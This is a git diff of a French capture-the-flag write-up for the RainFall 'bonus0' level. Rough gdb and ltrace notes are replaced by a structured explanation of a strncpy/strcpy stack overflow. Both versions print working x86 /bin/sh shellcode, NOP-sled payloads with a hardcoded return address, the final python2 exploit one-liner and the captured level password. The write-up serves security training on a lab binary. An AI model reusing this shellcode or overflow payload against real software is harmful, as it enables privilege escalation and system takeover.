@@ -1,311 +1,293 @@
-``` bash
+# BONUS0
+
+Le système de fichier se présente de cette manière :
+
+```diff
 bonus0@RainFall:~$ ls -la
+
 total 17
+
 dr-xr-x---+ 1 bonus0 bonus0   80 Mar  6  2016 .
 dr-x--x--x  1 root   root    340 Sep 23  2015 ..
--rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
--rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
--rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
--rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
--rw-r--r--  1 bonus0 bonus0  675 Apr  3  2012 .profile
+rw-r--r--  1 bonus0 bonus0  220 Apr  3  2012 .bash_logout
+rw-r--r--  1 bonus0 bonus0 3530 Sep 23  2015 .bashrc
++rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
+rw-r--r--+ 1 bonus0 bonus0   65 Sep 23  2015 .pass
+rw-r--r-- 1 bonus0 bonus0  675 Apr  3  2012 .profile
 ```
 
-``` bash
-(gdb) disas main
-Dump of assembler code for function main:
-   0x080485a4 <+0>:	push   ebp
-   0x080485a5 <+1>:	mov    ebp,esp
-   0x080485a7 <+3>:	and    esp,0xfffffff0
-   0x080485aa <+6>:	sub    esp,0x40
-   0x080485ad <+9>:	lea    eax,[esp+0x16]
-   0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
-   0x080485b4 <+16>:	call   0x804851e <pp>
-   0x080485b9 <+21>:	lea    eax,[esp+0x16]
-   0x080485bd <+25>:	mov    DWORD PTR [esp],eax
-   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
-   0x080485c5 <+33>:	mov    eax,0x0
-   0x080485ca <+38>:	leave  
-   0x080485cb <+39>:	ret    
-End of assembler dump.
-```
+Le binaire `bonus0` possède le SUID et appartient à `bonus1`.
 
-``` bash
+Il s'exécute donc avec les privilèges de `bonus1`.
 
-(gdb) disas pp
-Dump of assembler code for function pp:
-   0x0804851e <+0>:	push   ebp
-   0x0804851f <+1>:	mov    ebp,esp
-   0x08048521 <+3>:	push   edi
-   0x08048522 <+4>:	push   ebx
-   0x08048523 <+5>:	sub    esp,0x50
-   0x08048526 <+8>:	mov    DWORD PTR [esp+0x4],0x80486a0
-   0x0804852e <+16>:	lea    eax,[ebp-0x30]
-   0x08048531 <+19>:	mov    DWORD PTR [esp],eax
-   0x08048534 <+22>:	call   0x80484b4 <p>
-   0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
-   0x08048541 <+35>:	lea    eax,[ebp-0x1c]
-   0x08048544 <+38>:	mov    DWORD PTR [esp],eax
-   0x08048547 <+41>:	call   0x80484b4 <p>
-   0x0804854c <+46>:	lea    eax,[ebp-0x30]
-   0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
-   0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
-   0x08048556 <+56>:	mov    DWORD PTR [esp],eax
-   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
-   0x0804855e <+64>:	mov    ebx,0x80486a4
-   0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
-   0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
-   0x0804856d <+79>:	mov    edx,eax
-   0x0804856f <+81>:	mov    eax,0x0
-   0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
-   0x08048577 <+89>:	mov    edi,edx
-   0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
-   0x0804857b <+93>:	mov    eax,ecx
-   0x0804857d <+95>:	not    eax
-   0x0804857f <+97>:	sub    eax,0x1
-   0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
-   0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
-   0x08048588 <+106>:	mov    WORD PTR [eax],dx
-   0x0804858b <+109>:	lea    eax,[ebp-0x1c]
-   0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
-   0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
-   0x08048595 <+119>:	mov    DWORD PTR [esp],eax
-   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
-   0x0804859d <+127>:	add    esp,0x50
-   0x080485a0 <+130>:	pop    ebx
-   0x080485a1 <+131>:	pop    edi
-   0x080485a2 <+132>:	pop    ebp
-   0x080485a3 <+133>:	ret 
+## Analyse
 
+Le programme contient trois fonctions principales :
 
-   (gdb) disas p
-Dump of assembler code for function p:
-   0x080484b4 <+0>:	push   ebp
-   0x080484b5 <+1>:	mov    ebp,esp
-   0x080484b7 <+3>:	sub    esp,0x1018
-   0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
-   0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
-   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
-   0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
-   0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
-   0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
-   0x080484da <+38>:	mov    DWORD PTR [esp],0x0
-   0x080484e1 <+45>:	call   0x8048380 <read@plt>         #  read(int fd, void buf[count], size_t count);
-   0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
-   0x080484ee <+58>:	lea    eax,[ebp-0x1008]             # 4104
-   0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
-   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
-   0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
-   0x080484ff <+75>:	lea    eax,[ebp-0x1008]
-   0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
-   0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
-   0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
-   0x08048514 <+96>:	mov    DWORD PTR [esp],eax
-   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
-   0x0804851c <+104>:	leave  
-   0x0804851d <+105>:	ret 
-   ```
+* `main()`
+* `pp()`
+* `p()`
 
+### Fonction `p()`
 
-``` bash
-bonus0@RainFall:~$ ltrace ./bonus0
-__libc_start_main(0x80485a4, 1, 0xbffff7f4, 0x80485d0, 0x8048640 <unfinished ...>
-puts(" - " - 
-)                                                          = 4
-read(0, AAAAAAAAAAA
-"AAAAAAAAAAA\n", 4096)                                       = 12
-strchr("AAAAAAAAAAA\n", '\n')                                        = "\n"
-strncpy(0xbffff6d8, "AAAAAAAAAAA", 20)                               = 0xbffff6d8
-puts(" - " - 
-)                                                          = 4
-read(0, BBBBBBB
-"BBBBBBB\n", 4096)                                           = 8
-strchr("BBBBBBB\nAAA", '\n')                                         = "\nAAA" ----- > QUELLE ADRESSE??
-strncpy(0xbffff6ec, "BBBBBBB", 20)                                   = 0xbffff6ec
-strcpy(0xbffff726, "AAAAAAAAAAA")                                    = 0xbffff726
-strcat("AAAAAAAAAAA ", "BBBBBBB")                                    = "AAAAAAAAAAA BBBBBBB"  ------> 
-puts("AAAAAAAAAAA BBBBBBB"AAAAAAAAAAA BBBBBBB
-) 
-```
-
-strncpy(0xbffff6ec, "BBBBBBB", 20)       # diff = 58
-strcpy(0xbffff726, "AAAAAAAAAAA")
-
-
-0xbffff726 -> 
-->
-
-``` bash
-bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A" * 40)'); cat) |  ./bonus0
- - 
- - 
-BBBBBBBB
-AAAAAAAAAAAAAAAAAAAABBBBBBBB BBBBBBBB
-
-```
-
-bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)'); cat) |  ./bonus0
- - 
- - 
-BBBBBBBBBBBBBBBBB  
-AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB
-
-Segmentation fault (core dumped)
-== 17 B
-
-buffer1[20] + buffer2[16] + adresseEIP[4]
-
-0xbffffebb
-
-"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" 
-
-shelcode[34]
-
-copier le script dans /tmp
-getenv(VAR)
-("%p", getenv(VAR))
-
-GROSCRACK -> pour recuperer au bonne endroit la string
--> 0xbffffec9 + A
-= 0xbffffed3 (Alan a raison)
-
-----------
-
-
-
-
-
-bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("BBBBBBBBBBBBBBBB" + "\x80\xf8\xff\xbf")'); cat)) | ./bonus0
- - 
- - 
-AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDE���� BBBBCCCCDDDDE����
-id
-Segmentation fault (core dumped)
-
-
-``` bash
-(gdb) run < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("CCCCCCCCCCCCCCC" + "\xd3\xfe\xff\xbf")')))
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-
-Starting program: /home/user/bonus0/bonus0 < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("CCCCCCCCCCCCCCC" + "\xd3\xfe\xff\xbf")')))
- - 
- - 
-AAAAAAAAAAAAAAAAAAAACCCCCCCCCCCCCCC���� CCCCCCCCCCCCCCC����
-
-Program received signal SIGSEGV, Segmentation fault.
-0xfffed343 in ?? ()
-(gdb) 42
-Undefined command: "42".  Try "help".
-(gdb) run < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("CCCCCCCCCCCCCC" + "\xd3\xfe\xff\xbf")')))
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-
-Starting program: /home/user/bonus0/bonus0 < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 20)') && (echo $(python2 -c 'import sys; sys.stdout.write("CCCCCCCCCCCCCC" + "\xd3\xfe\xff\xbf")')))
- - 
- - 
-AAAAAAAAAAAAAAAAAAAACCCCCCCCCCCCCC���� CCCCCCCCCCCCCC����
-
-Program received signal SIGSEGV, Segmentation fault.
-0x00bffffe in ?? ()
-(gdb) 
-
-```
-
-
-BBBBBBBBBBBBBBBBBBBBBBBBB
-AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
-BBBBBBBBBBBBBBBBBBBBBBBBBBBB
-AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
-                                       f4 0f fd b7 20             f4 0f fd b7 00
-
-0x41414141	0x41414141
-0x41414141	0x41414141	0x42424141	0x42424242
-0x42424242	0x42424242	0x42424242	0x0ff44242
-0x4220b7fd	0x42424242	0x42424242	0x42424242
-0x42424242	0xf4424242
-
-00b7fd0ff4
-
-
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-
-
-
-
-segfault a 4096 'A'
+La fonction `p()` possède un buffer local de `4104` octets et lit jusqu'à `4096` octets depuis l'entrée standard.
 
 ```c
-void p(char *param_1,char *param_2)
-
+void p(char *dest, char *prompt)
 {
-  char *pcVar1;
-  char local_100c [4104];
-  
-  puts(param_2);
-  read(0,local_100c,0x1000);
-  pcVar1 = strchr(local_100c,10);
-  *pcVar1 = '\0';
-  strncpy(param_1,local_100c,0x14);
-  return;
+    char buffer[4104];
+
+    puts(prompt);
+    read(0, buffer, 4096);
+    *strchr(buffer, '\n') = '\0';
+    strncpy(dest, buffer, 20);
 }
 ```
 
+Après le `read()`, le programme cherche le premier `\n` avec :
 
-run < <(echo $(python2 -c 'import sys; sys.stdout.write("A" * 4096)'))
+```c
+strchr(buffer, '\n')
+```
 
+puis le remplace par `\0`.
 
+Enfin, seuls les `20` premiers caractères sont copiés dans `dest` avec :
 
-"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
-shelcode[34] 
-"A" * 17 + "\n" + 1044 + "\x90" * 3000 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x80\xeb\xff\xbf"
+```c
+strncpy(dest, buffer, 20);
+```
 
+La fonction `p()` ne vérifie donc pas réellement la longueur de l'entrée avant le `read()`. Cependant, le dépassement intéressant ne se produit pas directement dans `p()`, mais dans la manière dont les données sont ensuite utilisées par `pp()`.
 
-0xbfffeb80
-\x80\xeb\xff\xbf
+---
 
-bonus0@RainFall:~$ (echo $(python2 -c 'import sys; sys.stdout.write( "A" * 17 + "\n" + "B" * 2 + "\n" + "\x90" * 4035 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\x80\xeb\xff\xbf")'); cat) | ./bonus0
+### Fonction `pp()`
 
+La fonction `pp()` utilise deux buffers locaux de `20` octets :
 
-< <(echo $(python2 -c 'import sys; sys.stdout.write( "A" * 4 + "C" * 4 + "D" * 1 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\n" * 1000 + "\x90" * 3035 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")'))
+```c
+void pp(char *dest)
+{
+    char buffer1[20];
+    char buffer2[20];
+    size_t len;
 
+    p(buffer1, " - ");
+    p(buffer2, " - ");
 
-(echo "$(python2 -c 'import sys; sys.stdout.write( "A" * 9 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\n")')"; cat) | ./bonus0
+    strcpy(dest, buffer1);
 
+    len = strlen(dest);
+    dest[len] = ' ';
+    dest[len + 1] = '\0';
 
-ec - d8
-14 -> 20
-1000 -> 4096
+    strcat(dest, buffer2);
+}
+```
 
-(echo $(python2 -c 'import sys; sys.stdout.write( "A" * 9 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') && (echo $(python2 -c 'import sys; sys.stdout.write("B" * 15 + "\n")'); cat)) | ./bonus0
+Les deux appels à `p()` remplissent `buffer1` puis `buffer2`.
 
+D'après le désassemblage :
 
+```asm
+lea eax,[ebp-0x30]
+...
+call p
 
-(echo $(python2 -c 'import sys; sys.stdout.write( "A" * 9 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")') && (echo $(python2 -c 'import sys; sys.stdout.write("B" * 15 + "\n" )')))
+lea eax,[ebp-0x1c]
+...
+call p
+```
 
+on retrouve :
 
-(echo "$(python2 -c 'import sys; sys.stdout.write( "A" * 9 + "\x80\xeb\xff\xbf" + "\x0a" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("B" * 15 + "\n" )')"))
+```text
+buffer1 = ebp - 0x30
+buffer2 = ebp - 0x1c
+```
 
-(echo "$(python2 -c 'import sys; sys.stdout.write( "\n" "A" * 9 + "\x80\xeb\xff\xbf" + "\n" + "B" * 2 + "\x90" * 4046 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")')"; cat) | ./bonus0
+La différence entre les deux adresses est :
 
+```text
+0x30 - 0x1c = 0x14
+```
 
-AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���
+soit `20` octets.
 
-< <(echo "$(python2 -c 'import sys; sys.stdout.write("A" * 50 + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "\x80\xf8\xff\xbf" + "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + "\n" + "B")')"))
+Les deux buffers sont donc placés consécutivement en mémoire.
 
-< <(echo "$(python2 -c 'import sys; sys.stdout.write("A" * 500 + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "FFFF" + "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + "\n" + "B")')"))
+---
 
-< <(echo "$(python2 -c 'import sys; sys.stdout.write("A" * 50 + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "\x40\xe6\xff\xbf" + "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + "\n" + "B")')"))
+## Vulnérabilité
 
+Le problème principal vient de :
+
+```c
+strcpy(dest, buffer1);
+```
+
+`strcpy()` continue de copier jusqu'à rencontrer un caractère `\0`.
+
+Or, dans `p()`, on utilise :
+
+```c
+strncpy(dest, buffer, 20);
+```
+
+Si l'entrée contient exactement `20` caractères, `strncpy()` peut remplir complètement le buffer sans ajouter de `\0`.
+
+`buffer1` ne possède alors pas forcément de terminateur nul.
+
+Lorsque `strcpy()` commence à copier `buffer1`, il continue donc à lire les octets qui se trouvent après `buffer1` en mémoire.
+
+Comme `buffer2` se trouve juste après, les données peuvent être récupérées au-delà de `buffer1` et utilisées pour construire une chaîne plus longue que la taille prévue du buffer de destination.
+
+Cette chaîne est ensuite complétée par :
+
+```c
+strcat(dest, buffer2);
+```
+
+Le résultat permet finalement de dépasser le buffer de `main()` et d'écraser l'adresse de retour de la fonction.
+
+---
+
+## Buffer de `main()`
+
+Le désassemblage de `main()` montre :
+
+```asm
+sub esp,0x40
+lea eax,[esp+0x16]
+...
+call pp
+```
+
+Le buffer utilisé par `pp()` commence donc à `esp + 0x16`.
+
+Dans notre reconstruction :
+
+```c
+int main(void)
+{
+    char buffer[54];
+
+    pp(buffer);
+    puts(buffer);
+
+    return 0;
+}
+```
+
+Le but est donc de faire écrire `pp()` au-delà de ce buffer jusqu'à atteindre l'adresse de retour de `main()`.
+
+---
+
+# Exploitation
+
+L'exploitation repose sur deux éléments :
+
+1. placer un shellcode dans la mémoire du processus ;
+2. remplacer l'adresse de retour par une adresse qui pointe vers ce shellcode.
+
+## Shellcode
+
+On utilise un shellcode de `34` octets permettant d'exécuter `/bin/sh` :
+
+```text
+\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80
+\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3
+\x89\xd1\xcd\x80
+```
+
+---
+
+## NOP sled
+
+Pour faciliter le retour vers le shellcode, on place un NOP sled avant celui-ci :
+
+```text
+\x90
+```
+
+Le premier input contient donc :
+
+```text
+50 × "A"
+100 × "\x90"
+shellcode
+```
+
+Le shellcode est ainsi placé dans le buffer local utilisé par `p()`.
+
+Même si `p()` ne copie que les `20` premiers caractères vers `buffer1`, le contenu complet de l'entrée reste présent dans son buffer local sur la pile.
+
+On peut donc ensuite essayer de faire retourner l'exécution vers cette zone mémoire.
+
+Avec GDB, l'adresse utilisée pour atteindre le NOP sled a été déterminée à :
+
+```text
 0xbfffe640
+```
 
+En little endian, cette adresse devient :
 
-bonus0@RainFall:~$ (echo "$(python2 -c 'import sys; sys.stdout.write("A" * 50 + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "\x40\xe6\xff\xbf" + "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB" + "\n" + "B")')"); cat) | ./bonus0
- - 
- - 
-AAAAAAAAAAAAAAAAAAAABBBBCCCCD@���BBBBBBB��� BBBBCCCCD@���BBBBBBB���
-id
-uid=2011(bonus1) gid=2010(bonus0) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
-pwd            
-/home/user/bonus0
+```text
+\x40\xe6\xff\xbf
+```
+
+---
+
+## Deuxième input
+
+Le deuxième input sert à construire le débordement et à remplacer l'adresse de retour.
+
+On utilise notamment :
+
+```text
+BBBBCCCCD
+\x40\xe6\xff\xbf
+BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+```
+
+L'adresse `0xbfffe640` est donc placée dans le payload afin que l'exécution retourne dans la zone contenant le NOP sled et le shellcode.
+
+Le comportement recherché est alors :
+
+```text
+adresse de retour
+        ↓
+0xbfffe640
+        ↓
+NOP sled
+        ↓
+shellcode
+        ↓
+/bin/sh
+```
+
+---
+
+## Exploit final
+
+```bash
+(echo "$(python2 -c 'import sys; sys.stdout.write("A" * 50 + "\x90" * 100 + "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" + "\n" + "A")')" && (echo "$(python2 -c 'import sys; sys.stdout.write("BBBBCCCCD" + "\x40\xe6\xff\xbf" + "B" * 30 + "\n" + "B")')"); cat) | ./bonus0
+```
+
+On obtient un shell avec les privilèges de `bonus1` :
+
+```text
+uid=2011(bonus1) gid=2010(bonus0) egid=100(users)
+groups=2011(bonus1),100(users),2010(bonus0)
+```
+
+On peut alors récupérer le mot de passe :
+
+```bash
 cat /home/user/bonus1/.pass
+```
+
+```text
 cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+```
